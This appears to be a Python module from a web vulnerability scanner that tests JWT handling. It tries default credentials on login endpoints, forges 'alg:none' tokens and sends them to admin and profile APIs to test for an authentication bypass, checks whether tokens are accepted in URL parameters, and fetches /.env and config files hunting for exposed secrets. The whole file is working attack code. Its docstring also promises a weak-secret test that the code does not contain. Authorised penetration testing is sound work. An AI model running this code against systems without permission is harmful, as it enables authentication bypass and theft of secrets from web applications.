"""JWT Vulnerability Tester — none alg, weak secret, token leak"""
from core.config import JWT_PATHS, JWT_HEADERS, R, R2, B, B2, W, Y, G, D, N
from core.engine import http_get, http_post, save_report, vuln
import base64, json, re

def b64url_decode(s):
    s += "=" * (4 - len(s) % 4)
    try: return base64.urlsafe_b64decode(s)
    except: return b""

def b64url_encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def decode_jwt(token):
    parts = token.split(".")
    if len(parts) != 3: return None, None, None
    try:
        header = json.loads(b64url_decode(parts[0]))
        payload = json.loads(b64url_decode(parts[1]))
        return header, payload, parts[2]
    except: return None, None, None

def craft_none_jwt(token):
    parts = token.split(".")
    if len(parts) != 3: return None
    try:
        header = json.loads(b64url_decode(parts[0]))
        header["alg"] = "none"
        new_header = b64url_encode(json.dumps(header).encode())
        return f"{new_header}.{parts[1]}."
    except: return None

def run(target):
    print(f"\n{B2}  JWT vulnerability test on {W}{target}{N}")
    vulns = 0; findings = []
    tokens = []

    # Try to get a JWT token
    print(f"\n{D}  Attempting to obtain JWT tokens...{N}")
    for path in JWT_PATHS:
        url = target + path
        # Try login
        for creds in ['{"username":"admin","password":"admin"}',
                       '{"email":"test@test.com","password":"test"}',
                       '{"user":"admin","pass":"admin"}']:
            code, body = http_post(url, creds, timeout=8)
            if code in (200, 201):
                # Extract token from response
                m = re.search(r'["\']?token["\']?\s*[:=]\s*["\']?([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)', body)
                if m:
                    tokens.append(m.group(1))
                    print(f"   {G}[+]{W} Token obtained from {path}{N}")
                    break
        if tokens: break

    if not tokens:
        print(f"\n{Y}  [!] No JWT tokens obtained. Testing endpoints anyway.{N}")
        # Test for JWT in headers/cookies on main page
        code, hdrs, body = http_get(target)
        m = re.search(r'([A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,})', body)
        if m: tokens.append(m.group(1))

    # Analyze tokens
    for token in tokens:
        header, payload, sig = decode_jwt(token)
        if not header: continue

        print(f"\n{B2}  JWT Analysis:{N}")
        print(f"   {D}Algorithm: {header.get('alg','?')}{N}")
        print(f"   {D}Type: {header.get('typ','?')}{N}")
        if payload:
            for k in ["exp","iat","iss","sub","role","admin","isAdmin"]:
                if k in payload:
                    print(f"   {D}{k}: {payload[k]}{N}")

        # Test 1: None algorithm
        none_jwt = craft_none_jwt(token)
        if none_jwt:
            for path in ["/api/user", "/api/profile", "/api/admin", "/api/me", "/api/data"]:
                url = target + path
                code, hdrs, body = http_get(url, headers={"Authorization": f"Bearer {none_jwt}"})
                if code == 200 and len(body) > 50:
                    vuln("CRITICAL", "JWT 'none' algorithm accepted!", "Auth bypass via alg:none", url)
                    vulns += 1; findings.append({"type":"jwt_none","url":url})
                    break

        # Test 2: Token in URL (leak risk)
        for path in ["/api/user", "/api/profile"]:
            url = f"{target}{path}?token={token}"
            code, hdrs, body = http_get(url, timeout=7)
            if code == 200:
                vuln("MEDIUM", "JWT accepted in URL parameter!", "Token may leak in logs/referer")
                vulns += 1; findings.append({"type":"jwt_url_leak"})
                break

    # Test for exposed JWT secrets in env/config
    print(f"\n{D}  Checking for JWT secret exposure...{N}")
    for path in ["/.env", "/config.json", "/config.js", "/api/config"]:
        url = target + path
        code, hdrs, body = http_get(url, timeout=7)
        if code == 200 and any(k in body for k in ["JWT_SECRET","jwt_secret","SECRET_KEY","jwtSecret"]):
            vuln("CRITICAL", "JWT secret exposed!", f"Found in {path}", url)
            vulns += 1; findings.append({"type":"jwt_secret_leak","url":url})

    print(f"\n{G}  [✓] JWT scan done — {vulns} findings{N}")
    if findings: save_report("jwt_breaker", {"target":target,"findings":findings})
    return vulns
